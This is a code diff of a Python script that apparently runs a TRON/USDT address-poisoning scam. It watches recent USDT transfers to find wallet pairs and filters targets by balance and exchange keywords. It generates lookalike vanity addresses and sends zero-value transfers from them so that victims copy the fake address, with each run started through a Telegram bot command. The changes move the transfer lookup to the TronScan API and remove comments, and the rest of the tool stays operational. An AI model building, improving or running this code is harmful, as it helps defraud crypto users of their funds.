@@ -16,8 +16,6 @@ REQUIRED_CONSECUTIVE = 2
 WINDOW_DAYS = 7              
 
 # Estimated Gas Cost per pair (in TRX)
-# Tx1 (Main->Vanity) activates the new wallet (~1.1 TRX)
-# Tx2 (Vanity->Wallet A) sends the $0 value (~0.1 to 1.1 TRX)
 GAS_COST_PER_PAIR_TRX = 2.2 
 
 CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']
@@ -50,7 +48,6 @@ def send_telegram_alert(message, parse_mode="HTML"):
         print(f"Telegram error: {e}")
 
 def get_telegram_updates(offset):
-    """Polls Telegram for new messages from the user."""
     url = f"{TELEGRAM_URL}/getUpdates"
     params = {"offset": offset, "timeout": 30}
     try:
@@ -93,16 +90,32 @@ def get_trx_balance(address):
     return int(data["data"][0].get("balance", 0)) / 1_000_000
 
 def get_recent_usdt_receivers(limit=50):
+    """Fetches recent USDT transfers using TronScan (more reliable for global searches)."""
     end_ms = int(datetime.now(timezone.utc).timestamp() * 1000)
     start_ms = int((datetime.now(timezone.utc) - timedelta(hours=1)).timestamp() * 1000)
-    data = trongrid_get("/v1/transactions/trc20", {
-        "only_confirmed": "true", "limit": limit, "order_by": "block_timestamp,desc",
-        "min_timestamp": start_ms, "max_timestamp": end_ms, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
-    })
-    receivers = set()
-    if data and data.get("data"):
-        for row in data["data"]: receivers.add(row.get("to"))
-    return list(receivers)
+    
+    headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
+    try:
+        response = requests.get(
+            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
+            params={
+                "start": 0, "limit": limit, "sort": "-timestamp",
+                "start_timestamp": start_ms, "end_timestamp": end_ms,
+                "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+            },
+            headers=headers, timeout=30
+        )
+        data = response.json()
+        receivers = set()
+        if data and data.get("data"):
+            for row in data["data"]:
+                to_addr = row.get("to") or row.get("toAddress") or row.get("to_address")
+                if to_addr:
+                    receivers.add(to_addr)
+        return list(receivers)
+    except Exception as e:
+        print(f"TronScan fetch error: {e}")
+        return []
 
 # =========================
 # 4. VANITY & TRANSFER LOGIC
@@ -162,7 +175,6 @@ def main():
             trx_bal = get_trx_balance(wallet_b)
             if usdt_bal + (trx_bal * 0.25) < MIN_BALANCE_USD: continue
                 
-            # Fetch transfers (simplified for speed)
             data = trongrid_get(f"/v1/accounts/{wallet_b}/transactions/trc20", {
                 "only_confirmed": "true", "only_to": "true", "limit": 10, "order_by": "block_timestamp,desc",
                 "min_timestamp": start_ms, "max_timestamp": end_ms, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
@@ -202,7 +214,6 @@ def main():
             if update.get("message") and str(update["message"].get("chat", {}).get("id")) == str(CHAT_ID):
                 text = update["message"].get("text", "").strip()
                 
-                # COMMAND: INFO
                 if text.lower() == "info":
                     total_cost = len(found_pairs) * GAS_COST_PER_PAIR_TRX
                     msg = f"📊 <b>Wallet Information & Cost</b>\n\n"
@@ -214,7 +225,6 @@ def main():
                         msg += f"<b>Pair {i+1}:</b>\nA: <code>{p['wallet_a']}</code>{cex_tag}\nB: <code>{p['wallet_b']}</code>\n\n"
                     send_telegram_alert(msg)
                 
-                # COMMAND: EXCLUDE
                 elif text.lower().startswith("exclude"):
                     parts = text.split()
                     if len(parts) > 1:
@@ -227,19 +237,18 @@ def main():
                         else:
                             send_telegram_alert(f"❌ Address <code>{addr_to_exclude}</code> not found in current list.")
                     else:
-                        send_telegram_alert("️ Usage: <b>exclude [Address]</b>")
+                        send_telegram_alert("⚠️ Usage: <b>exclude [Address]</b>")
                 
-                # COMMAND: TRANSFER
                 elif text.lower() == "transfer":
                     if not found_pairs:
                         send_telegram_alert("❌ No pairs left to process!")
                     else:
                         send_telegram_alert(f"🚀 <b>Trigger Accepted!</b>\nExecuting $0 transfers for {len(found_pairs)} pairs...")
                         execution_triggered = True
-                        break # Break out of update loop
+                        break 
         
         if not execution_triggered:
-            time.sleep(5) # Polling interval
+            time.sleep(5)
 
     # --- PHASE 3: EXECUTION ---
     print(f"\n🎯 Executing transfers for {len(found_pairs)} pairs...")
@@ -253,7 +262,7 @@ def main():
         print(f"Generated Vanity: {vanity_addr}")
         
         tx1 = send_zero_value_trx(PRIVATE_KEY, vanity_addr)
-        time.sleep(3) # Wait for activation
+        time.sleep(3)
         
         tx2 = send_zero_value_trx(vanity_priv, wallet_a)
         
